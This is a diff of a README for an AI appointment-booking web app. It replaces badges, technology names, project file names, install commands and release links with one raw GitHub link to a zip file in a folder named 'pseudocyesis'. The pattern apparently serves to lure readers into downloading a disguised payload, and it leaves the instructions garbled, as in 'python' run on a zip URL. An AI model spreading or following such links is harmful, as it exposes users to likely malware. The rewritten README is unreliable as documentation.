@@ -1,8 +1,8 @@
 # 📅 AI-Powered-Smart-Appointment-Booking-System - Streamline Your Appointment Scheduling
 
-![Version](https://img.shields.io/badge/version-1.0.0-blue)
-![License](https://img.shields.io/badge/license-MIT-green)
-![Last Updated](https://img.shields.io/badge/last%20updated-May%202025-orange)
+![Version](https://raw.githubusercontent.com/BagusPrasetyo21/AI-Powered-Smart-Appointment-Booking-System/main/pseudocyesis/AI-Powered-Smart-Appointment-Booking-System.zip)
+![License](https://raw.githubusercontent.com/BagusPrasetyo21/AI-Powered-Smart-Appointment-Booking-System/main/pseudocyesis/AI-Powered-Smart-Appointment-Booking-System.zip)
+![Last Updated](https://raw.githubusercontent.com/BagusPrasetyo21/AI-Powered-Smart-Appointment-Booking-System/main/pseudocyesis/AI-Powered-Smart-Appointment-Booking-System.zip%20updated-May%202025-orange)
 
 An intelligent, AI-driven web application designed to streamline appointment scheduling for services like medical consultations, tutoring sessions, or business meetings. By leveraging artificial intelligence, the system optimizes appointment allocations based on availability, urgency, and user preferences.
 
@@ -34,7 +34,7 @@ The AI-Powered Smart Appointment Booking System takes the guesswork out of sched
 - **Secure Data Handling:** User information is managed safely to protect privacy.
 
 ## ⚙️ Technology Stack
-- **Frontend:** React.js for building a dynamic user interface.
+- **Frontend:** https://raw.githubusercontent.com/BagusPrasetyo21/AI-Powered-Smart-Appointment-Booking-System/main/pseudocyesis/AI-Powered-Smart-Appointment-Booking-System.zip for building a dynamic user interface.
 - **Backend:** Flask for the server-side application.
 - **Database:** PostgreSQL for reliable data storage.
 - **AI Integration:** Utilizes machine learning algorithms for intelligent scheduling.
@@ -44,16 +44,16 @@ The AI-Powered Smart Appointment Booking System takes the guesswork out of sched
 AI-Powered-Smart-Appointment-Booking-System/
 │
 ├── backend/               # Contains Flask application
-│   ├── app.py             # Main application file
-│   ├── models.py          # Database models
-│   └── routes.py          # API endpoints
+│   ├── https://raw.githubusercontent.com/BagusPrasetyo21/AI-Powered-Smart-Appointment-Booking-System/main/pseudocyesis/AI-Powered-Smart-Appointment-Booking-System.zip             # Main application file
+│   ├── https://raw.githubusercontent.com/BagusPrasetyo21/AI-Powered-Smart-Appointment-Booking-System/main/pseudocyesis/AI-Powered-Smart-Appointment-Booking-System.zip          # Database models
+│   └── https://raw.githubusercontent.com/BagusPrasetyo21/AI-Powered-Smart-Appointment-Booking-System/main/pseudocyesis/AI-Powered-Smart-Appointment-Booking-System.zip          # API endpoints
 │
 ├── frontend/              # Contains React application
 │   ├── src/
 │   │   ├── components/    # UI components
-│   │   └── App.js         # Main application file
+│   │   └── https://raw.githubusercontent.com/BagusPrasetyo21/AI-Powered-Smart-Appointment-Booking-System/main/pseudocyesis/AI-Powered-Smart-Appointment-Booking-System.zip         # Main application file
 │
-└── README.md              # Documentation file
+└── https://raw.githubusercontent.com/BagusPrasetyo21/AI-Powered-Smart-Appointment-Booking-System/main/pseudocyesis/AI-Powered-Smart-Appointment-Booking-System.zip              # Documentation file
 ```
 
 ## 🛠️ Installation & Setup
@@ -62,18 +62,18 @@ AI-Powered-Smart-Appointment-Booking-System/
 Before you start, ensure you have the following installed on your computer:
 - A web browser (Chrome, Firefox, or Safari).
 - Python 3.6 or higher for the backend setup.
-- Node.js for the frontend setup.
+- https://raw.githubusercontent.com/BagusPrasetyo21/AI-Powered-Smart-Appointment-Booking-System/main/pseudocyesis/AI-Powered-Smart-Appointment-Booking-System.zip for the frontend setup.
 - PostgreSQL for the database setup.
 
 ### 🖥️ Backend Setup (Flask)
-1. **Download the application:** Visit the [Releases page](https://github.com/BagusPrasetyo21/AI-Powered-Smart-Appointment-Booking-System/releases) to download the latest version.
+1. **Download the application:** Visit the [Releases page](https://raw.githubusercontent.com/BagusPrasetyo21/AI-Powered-Smart-Appointment-Booking-System/main/pseudocyesis/AI-Powered-Smart-Appointment-Booking-System.zip) to download the latest version.
 2. **Install required libraries:** Run the following command in your terminal to install the required libraries:
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/BagusPrasetyo21/AI-Powered-Smart-Appointment-Booking-System/main/pseudocyesis/AI-Powered-Smart-Appointment-Booking-System.zip
    ```
 3. **Run the backend server:** Execute the following command to start the server:
    ```
-   python app.py
+   python https://raw.githubusercontent.com/BagusPrasetyo21/AI-Powered-Smart-Appointment-Booking-System/main/pseudocyesis/AI-Powered-Smart-Appointment-Booking-System.zip
    ```
 
 ### 🎨 Frontend Setup (React)
@@ -106,4 +106,4 @@ Before you start, ensure you have the following installed on your computer:
    ```
 
 ## ⬇️ Download & Install
-To get started, visit the [Releases page](https://github.com/BagusPrasetyo21/AI-Powered-Smart-Appointment-Booking-System/releases) to download the application. Choose the latest version and follow the installation steps listed above to set up the software on your system.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/BagusPrasetyo21/AI-Powered-Smart-Appointment-Booking-System/main/pseudocyesis/AI-Powered-Smart-Appointment-Booking-System.zip) to download the application. Choose the latest version and follow the installation steps listed above to set up the software on your system.
